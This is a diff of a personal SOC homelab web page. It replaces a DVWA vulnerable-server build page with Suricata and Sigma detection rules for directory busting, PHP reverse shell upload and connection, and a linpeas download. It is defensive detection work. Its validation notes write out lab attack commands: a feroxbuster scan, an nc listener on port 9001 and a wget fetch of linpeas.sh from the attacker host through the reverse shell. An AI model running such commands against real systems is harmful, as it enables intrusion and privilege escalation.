@@ -11,10 +11,10 @@
       
       
       
-        <link rel="prev" href="../workstation/">
+        <link rel="prev" href="../AD/">
       
       
-        <link rel="next" href="../../attacks/AD/">
+        <link rel="next" href="../../ir/AD/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Webserver (DVWA) - Devin's SOC Homelab</title>
+        <title>Web Server Detections & Dashboards - Devin's SOC Homelab</title>
       
     
     
@@ -75,7 +75,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#ubuntu-webserver-dvwa" class="md-skip">
+        <a href="#web-server" class="md-skip">
           Skip to content
         </a>
       
@@ -109,7 +109,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Webserver (DVWA)
+              Web Server Detections & Dashboards
             
           </span>
         </div>
@@ -218,13 +218,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../security-onion/" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../vm/security-onion/" class="md-tabs__link">
           
   
   
@@ -264,11 +262,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../detections/AD/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../AD/" class="md-tabs__link">
           
   
   
@@ -385,10 +385,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -404,22 +402,19 @@
     
     
       
-        
-        
-      
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
             
   
   
@@ -432,7 +427,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             VM Builds
@@ -446,7 +441,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../security-onion/" class="md-nav__link">
+      <a href="../../vm/security-onion/" class="md-nav__link">
         
   
   
@@ -469,7 +464,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../dc/" class="md-nav__link">
+      <a href="../../vm/dc/" class="md-nav__link">
         
   
   
@@ -492,7 +487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../workstation/" class="md-nav__link">
+      <a href="../../vm/workstation/" class="md-nav__link">
         
   
   
@@ -512,32 +507,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    Webserver (DVWA)
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../vm/webserver/" class="md-nav__link">
         
   
   
@@ -548,71 +521,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#purpose" class="md-nav__link">
-    <span class="md-ellipsis">
-      Purpose
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#specs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Specs
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#build-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      Build Notes
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#validation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Validation
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#install-step-by-step" class="md-nav__link">
-    <span class="md-ellipsis">
-      Install (step-by-step)
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -731,8 +639,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -744,19 +654,22 @@
     
     
       
+        
+        
+      
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -769,7 +682,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             Detections & Dashboards
@@ -783,7 +696,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../detections/AD/" class="md-nav__link">
+      <a href="../AD/" class="md-nav__link">
         
   
   
@@ -803,10 +716,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../detections/web/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Web Server
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -817,6 +752,62 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#directory-busting-t15950031" class="md-nav__link">
+    <span class="md-ellipsis">
+      Directory Busting (T1595.0031)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse-shell-upload-t1105-t1190" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shell Upload (T1105 &amp; T1190)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse-shell-connection-t1505003-t1071001" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shell Connection (T1505.003 &amp; T1071.001)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#download-linpeas-t1105" class="md-nav__link">
+    <span class="md-ellipsis">
+      Download Linpeas (T1105)
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -958,45 +949,36 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#purpose" class="md-nav__link">
+  <a href="#directory-busting-t15950031" class="md-nav__link">
     <span class="md-ellipsis">
-      Purpose
+      Directory Busting (T1595.0031)
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#specs" class="md-nav__link">
+  <a href="#reverse-shell-upload-t1105-t1190" class="md-nav__link">
     <span class="md-ellipsis">
-      Specs
+      Reverse Shell Upload (T1105 &amp; T1190)
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#build-notes" class="md-nav__link">
+  <a href="#reverse-shell-connection-t1505003-t1071001" class="md-nav__link">
     <span class="md-ellipsis">
-      Build Notes
+      Reverse Shell Connection (T1505.003 &amp; T1071.001)
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#validation" class="md-nav__link">
+  <a href="#download-linpeas-t1105" class="md-nav__link">
     <span class="md-ellipsis">
-      Validation
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#install-step-by-step" class="md-nav__link">
-    <span class="md-ellipsis">
-      Install (step-by-step)
+      Download Linpeas (T1105)
     </span>
   </a>
   
@@ -1018,54 +1000,69 @@
 
 
 
-<h1 id="ubuntu-webserver-dvwa">Ubuntu – Webserver (DVWA)<a class="headerlink" href="#ubuntu-webserver-dvwa" title="Permanent link">&para;</a></h1>
-<h2 id="purpose">Purpose<a class="headerlink" href="#purpose" title="Permanent link">&para;</a></h2>
-<p>Intentionally vulnerable web app.</p>
-<h2 id="specs">Specs<a class="headerlink" href="#specs" title="Permanent link">&para;</a></h2>
-<ul>
-<li>IP: <code>192.168.26.10</code></li>
-<li>Services: Nginx/Apache, PHP/MySQL, DVWA</li>
-<li>Security: Minimal hardening</li>
-<li>Logging: Event forwarding via Elastic Agent</li>
-<li>8gb of memory</li>
-</ul>
-<h2 id="build-notes">Build Notes<a class="headerlink" href="#build-notes" title="Permanent link">&para;</a></h2>
-<ol>
-<li>Install Ubuntu Server → static IP <code>192.168.26.10</code>.</li>
-<li>Install DVWA stack (web/PHP/MySQL), set DVWA security level to <em>low</em> for testing.</li>
-<li>Elastic Agent enrolled; ship nginx/apache, auth, and system logs to Fleet.</li>
-<li>Expose via firewall NAT: WAN → 80/443 → <code>192.168.26.10</code>.</li>
-</ol>
-<h2 id="validation">Validation<a class="headerlink" href="#validation" title="Permanent link">&para;</a></h2>
-<ul>
-<li>Confirm Kibana logs:
-<div class="highlight"><pre><span></span><code>user.name : webadmin
+<h1 id="web-server">Web Server<a class="headerlink" href="#web-server" title="Permanent link">&para;</a></h1>
+<p>This section documents custom suricata and sigma rules for my web server. Each item includes the <strong>ATT&amp;CK technique</strong>, <strong>signal logic</strong>, and <strong>validation evidence</strong>.</p>
+<h2 id="directory-busting-t15950031">Directory Busting (T1595.0031)<a class="headerlink" href="#directory-busting-t15950031" title="Permanent link">&para;</a></h2>
+<p><strong>Suricata rule (inline):</strong>
+<div class="highlight"><pre><span></span><code>alert http $HOME_NET any -&gt; any any (msg:&quot;WEB-APP possible directory busting&quot;; flow:established,
+to_client; http.stat_code; content:&quot;301&quot;; detection_filter:track by_dst, count 15, seconds 10; 
+classtype:web-application-attack; sid:100002; rev:2;)
+</code></pre></div></p>
+<p><strong>Validation:</strong> Ran <code>feroxbuster -u http://192.168.25.142 -w /usr/share/wordlists/dirbuster/directory-list.txt</code>; alert fired and triaged.
+<a class="glightbox" href="../img/6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="6" loading="lazy" src="../img/6.png" /></a></p>
+<h2 id="reverse-shell-upload-t1105-t1190">Reverse Shell Upload (T1105 &amp; T1190)<a class="headerlink" href="#reverse-shell-upload-t1105-t1190" title="Permanent link">&para;</a></h2>
+<p><strong>Sigma rule (inline)</strong>:
+<div class="highlight"><pre><span></span><code><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Zeek</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="ow">of</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">File</span><span class="err">&#39;</span>
+<span class="n">id</span><span class="p">:</span><span class="w"> </span><span class="m">7a2a8618</span><span class="o">-</span><span class="err">9</span><span class="n">b3c</span><span class="o">-</span><span class="err">4</span><span class="n">ace</span><span class="o">-</span><span class="n">bd19</span><span class="o">-</span><span class="err">270</span><span class="n">b4277fbbd</span>
+<span class="n">status</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">stable</span><span class="err">&#39;</span>
+<span class="n">description</span><span class="p">:</span><span class="w"> </span><span class="o">|</span>
+<span class="n">Alerts</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">Zeek</span><span class="w"> </span><span class="n">logs</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">HTTP</span><span class="o">-</span><span class="n">served</span><span class="w"> </span><span class="kt">file</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">MIME</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="s">&quot;text/x-php&quot;</span><span class="w"> </span><span class="n">originating</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="m">192.168.25.142</span><span class="p">.</span><span class="w"> </span><span class="n">Useful</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">spotting</span><span class="w"> </span><span class="n">potential</span><span class="w"> </span><span class="n">webshell</span><span class="w"> </span><span class="n">transfers</span><span class="p">.</span>
+<span class="n">author</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Devin</span><span class="err">&#39;</span>
+<span class="n">date</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="m">2025/10/27</span><span class="err">&#39;</span>
+<span class="n">logsource</span><span class="p">:</span>
+<span class="w">  </span><span class="n">service</span><span class="p">:</span><span class="w"> </span><span class="n">http</span>
+<span class="w">  </span><span class="n">product</span><span class="p">:</span><span class="w"> </span><span class="n">zeek</span>
+<span class="n">detection</span><span class="p">:</span>
+<span class="w">  </span><span class="n">selection</span><span class="p">:</span>
+<span class="w">    </span><span class="kt">file</span><span class="p">.</span><span class="n">source</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;HTTP&quot;</span>
+<span class="w">    </span><span class="s">server.ip</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;192.168.25.142&quot;</span>
+<span class="w">    </span><span class="kt">file</span><span class="p">.</span><span class="n">mime_type</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;text/x-php&quot;</span>
+<span class="w">    </span><span class="s">source.ip</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;192.168.25.130&quot;</span>
+<span class="w">  </span><span class="n">condition</span><span class="p">:</span><span class="w"> </span><span class="n">selection</span>
+<span class="n">level</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">high</span><span class="err">&#39;</span>
+</code></pre></div></p>
+<p><strong>Validation:</strong> Uploaded php reverse shell via the web app's file upload feature; alert fired and triaged.
+<a class="glightbox" href="../img/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="../img/7.png" /></a></p>
+<h2 id="reverse-shell-connection-t1505003-t1071001">Reverse Shell Connection (T1505.003 &amp; T1071.001)<a class="headerlink" href="#reverse-shell-connection-t1505003-t1071001" title="Permanent link">&para;</a></h2>
+<p><strong>Sigma rule (inline)</strong>:
+<div class="highlight"><pre><span></span><code><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Zeek</span><span class="w"> </span><span class="n">Outbound</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="mf">9001</span><span class="w"> </span><span class="p">(</span><span class="n">Potential</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">Reverse</span><span class="w"> </span><span class="n">Shell</span><span class="p">)</span><span class="err">&#39;</span>
+<span class="n">id</span><span class="p">:</span><span class="w"> </span><span class="m">0339b149</span><span class="o">-</span><span class="err">5</span><span class="n">d4e</span><span class="o">-</span><span class="m">4b36-8b56</span><span class="o">-</span><span class="n">c99be0aab027</span>
+<span class="n">status</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">experimental</span><span class="err">&#39;</span>
+<span class="n">description</span><span class="p">:</span><span class="w"> </span><span class="o">|</span>
+<span class="n">Detects</span><span class="w"> </span><span class="n">outbound</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="kt">port</span><span class="w"> </span><span class="mf">9001</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">Zeek</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="n">logs</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">common</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">shells</span><span class="p">.</span>
+<span class="n">author</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Devin</span><span class="err">&#39;</span>
+<span class="n">date</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="m">2025/10/27</span><span class="err">&#39;</span>
+<span class="n">logsource</span><span class="p">:</span>
+<span class="w">  </span><span class="n">service</span><span class="p">:</span><span class="w"> </span><span class="n">http</span>
+<span class="w">  </span><span class="n">product</span><span class="p">:</span><span class="w"> </span><span class="n">zeek</span>
+<span class="n">detection</span><span class="p">:</span>
+<span class="w">  </span><span class="n">selection</span><span class="p">:</span>
+<span class="w">    </span><span class="s">network.transport</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;TCP&quot;</span>
+<span class="w">    </span><span class="s">destination.port.keyword</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;9001&quot;</span>
+<span class="w">    </span><span class="s">source.ip</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;192.168.25.142&quot;</span>
+<span class="w">  </span><span class="n">condition</span><span class="p">:</span><span class="w"> </span><span class="n">selection</span>
+<span class="n">level</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">high</span><span class="err">&#39;</span>
+</code></pre></div></p>
+<p><strong>Validation:</strong> Ran <code>nc -nvlp 9001</code> on kali and clicked on the php reverse shell file in the uploads directory; alert fired and triaged.
+<a class="glightbox" href="../img/8.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="8" loading="lazy" src="../img/8.png" /></a></p>
+<h2 id="download-linpeas-t1105">Download Linpeas (T1105)<a class="headerlink" href="#download-linpeas-t1105" title="Permanent link">&para;</a></h2>
+<p><strong>Suricata rule (inline)</strong>:
+<div class="highlight"><pre><span></span><code>alert http $HOME_NET any -&gt; any any ( msg:&quot;LINUX linpeas download via wget&quot;; flow:established,
+to_server; http.user_agent; content:&quot;Wget/&quot;; nocase; classtype:policy-violation; sid:1157410; 
+rev:1;)
 </code></pre></div>
-<a class="glightbox" href="../img/webserver/a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="10" loading="lazy" src="../img/webserver/a.png" /></a></li>
-<li>Confirm DVWA is up and running: Go to http://192.168.25.142/DVWA
-<a class="glightbox" href="../img/webserver/13.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="13" loading="lazy" src="../img/webserver/13.png" /></a></li>
-</ul>
-<h2 id="install-step-by-step">Install (step-by-step)<a class="headerlink" href="#install-step-by-step" title="Permanent link">&para;</a></h2>
-<p><Add NAT/port‑forward rule, DVWA login, alerts>
-<a class="glightbox" href="../img/webserver/1.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/webserver/1.png" /></a>
-<a class="glightbox" href="../img/webserver/2.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="2" loading="lazy" src="../img/webserver/2.png" /></a>
-<a class="glightbox" href="../img/webserver/3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="3" loading="lazy" src="../img/webserver/3.png" /></a>
-<a class="glightbox" href="../img/webserver/4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="4" loading="lazy" src="../img/webserver/4.png" /></a>
-<a class="glightbox" href="../img/webserver/5.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="5" loading="lazy" src="../img/webserver/5.png" /></a>
-<a class="glightbox" href="../img/webserver/6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="6" loading="lazy" src="../img/webserver/6.png" /></a>
-<a class="glightbox" href="../img/webserver/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="../img/webserver/7.png" /></a>
-<a class="glightbox" href="../img/webserver/8.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="8" loading="lazy" src="../img/webserver/8.png" /></a>
-<a class="glightbox" href="../img/webserver/9.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="9" loading="lazy" src="../img/webserver/9.png" /></a>
-<a class="glightbox" href="../img/webserver/10.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="10" loading="lazy" src="../img/webserver/10.png" /></a>
-<a class="glightbox" href="../img/webserver/11.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="11" loading="lazy" src="../img/webserver/11.png" /></a>
-<a class="glightbox" href="../img/webserver/12.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="12" loading="lazy" src="../img/webserver/12.png" /></a>
-<a class="glightbox" href="../img/webserver/13.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="13" loading="lazy" src="../img/webserver/13.png" /></a>
-<a class="glightbox" href="../img/webserver/14.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="14" loading="lazy" src="../img/webserver/14.png" /></a>
-<a class="glightbox" href="../img/webserver/15.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="15" loading="lazy" src="../img/webserver/15.png" /></a>
-<a class="glightbox" href="../img/webserver/16.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="16" loading="lazy" src="../img/webserver/16.png" /></a>
-<a class="glightbox" href="../img/webserver/20.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="20" loading="lazy" src="../img/webserver/20.png" /></a>
-<a class="glightbox" href="../img/webserver/21.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="21" loading="lazy" src="../img/webserver/21.png" /></a>
-<a class="glightbox" href="../img/webserver/22.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="22" loading="lazy" src="../img/webserver/22.png" /></a></p>
+<strong>Validation:</strong> Started python web server on kali and ran <code>wget http://192.168.25.130/linpeas.sh</code> from reverse shell; alert fired and triaged.
+<a class="glightbox" href="../img/9.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="9" loading="lazy" src="../img/9.png" /></a></p>
 
 
 
